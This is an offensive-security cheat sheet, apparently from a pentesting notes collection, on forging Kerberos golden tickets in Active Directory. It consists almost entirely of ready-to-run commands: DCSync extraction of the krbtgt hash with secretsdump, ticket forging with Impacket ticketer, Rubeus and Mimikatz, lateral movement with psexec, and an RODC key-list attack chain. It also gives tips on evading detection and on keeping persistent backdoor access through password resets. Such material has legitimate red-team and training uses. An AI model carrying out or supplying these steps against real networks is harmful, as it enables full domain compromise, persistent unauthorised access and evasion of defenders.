title: golden-ticket
html:
golden-ticket

Forge TGTs using the krbtgt account hash. Provides persistent domain-level access -- any user, any group, any ticket lifetime. Requires the krbtgt hash (obtained via DCSync or NTDS extraction).

When to Use

- Have krbtgt NTLM hash or AES key (post-compromise) - Want persistent domain admin access - Need to impersonate any user including Administrator - Backdoor access even after password resets (until krbtgt is rotated twice)

Prerequisites

Collect these before forging:

# Domain SID
lookupsid.py 'domain.local/user:pass@DC_IP' | grep 'Domain SID'

# krbtgt hash via DCSync
secretsdump.py 'domain.local/admin:pass@DC_IP' -just-dc-user krbtgt

Impacket - ticketer.py

Forge golden ticket (NTLM)

ticketer.py -nthash KRBTGT_NTHASH -domain-sid S-1-5-21-XXXX -domain domain.local Administrator

Forge golden ticket (AES256)

ticketer.py -aesKey AES256_KEY -domain-sid S-1-5-21-XXXX -domain domain.local Administrator

Use the ticket

export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@dc.domain.local

Rubeus

Forge golden ticket

.\Rubeus.exe golden /rc4:KRBTGT_NTHASH /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt

With AES256 (opsec-safe)

.\Rubeus.exe golden /aes256:AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt

With specific groups (DA, EA, Schema Admins)

.\Rubeus.exe golden /aes256:AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /groups:512,519,518 /ptt

Mimikatz

kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:KRBTGT_NTHASH /ptt

RODC Golden Ticket

From an RODC, the krbtgt account is krbtgt_XXXXX where XXXXX is the RODC number. Tickets forged with this key must be validated by a writable DC via the key list attack.

Forge RODC golden ticket (Rubeus)

.\Rubeus.exe golden /rodcNumber:XXXXX /aes256:RODC_AES256_KEY /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt

Key list attack -- exchange RODC ticket for real TGT

.\Rubeus.exe asktgs /ticket:rodc_ticket.kirbi /keyList /service:krbtgt/domain.local /dc:dc.domain.local /ptt

Full RODC chain (from Garfield box)

# 1. Forge golden ticket with RODC krbtgt
.\Rubeus.exe golden /rodcNumber:25181 /aes256:RODC_AES256 /domain:domain.local /sid:S-1-5-21-XXXX /user:Administrator /ptt

# 2. Key list attack to get real TGT from writable DC
.\Rubeus.exe asktgs /ticket:<base64_ticket> /keyList /service:krbtgt/domain.local /dc:dc01.domain.local /ptt

# 3. Now DCSync with the real TGT
.\Rubeus.exe dump /service:krbtgt

Clock Skew Fix (Exegol)

Kerberos requires clocks within 5 minutes. In exegol:

# Sync time with DC
faketime "$(ntpdate -q DC_IP 2>/dev/null | head -1 | cut -d' ' -f1,2)" ticketer.py ...

# Or set system time
rdate -n DC_IP

Notes

- Golden ticket survives password resets -- only rotating krbtgt TWICE invalidates it - AES256 is preferred over RC4 for opsec (RC4 triggers alerts) - RODC golden tickets only work for users in the RODC's msDS-RevealOnDemandGroup - Key list attack (/keyList) converts RODC ticket to full DC ticket - Default ticket lifetime is 10 years in forged tickets
